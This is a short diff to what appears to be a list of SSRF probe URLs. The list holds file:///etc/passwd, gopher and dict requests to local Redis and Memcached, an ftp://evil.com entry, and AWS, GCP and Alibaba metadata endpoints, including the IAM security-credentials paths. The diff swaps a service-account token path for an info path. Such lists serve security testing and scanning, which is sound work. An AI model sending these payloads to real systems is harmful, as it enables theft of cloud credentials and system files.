@@ -12,14 +12,14 @@ file:///etc/passwd
 dict://localhost:11211/STATS
 gopher://localhost:6379/_SET key value
 ftp://evil.com:21/anonymous
-s3://internal-bucket.s3.amazonaws.com/secret
+s3://bucket/config
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
 http://169.254.169.254/latest/meta-data/placement/availability-zone
 http://169.254.169.254/latest/meta-data/public-ipv4
 http://169.254.169.254/latest/meta-data/public-hostname
 http://metadata.google.internal/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/info
 http://metadata.google.internal/computeMetadata/v1/project/project-id
 http://100.100.100.200/latest/meta-data/
 http://10.0.0.1/latest/meta-data/
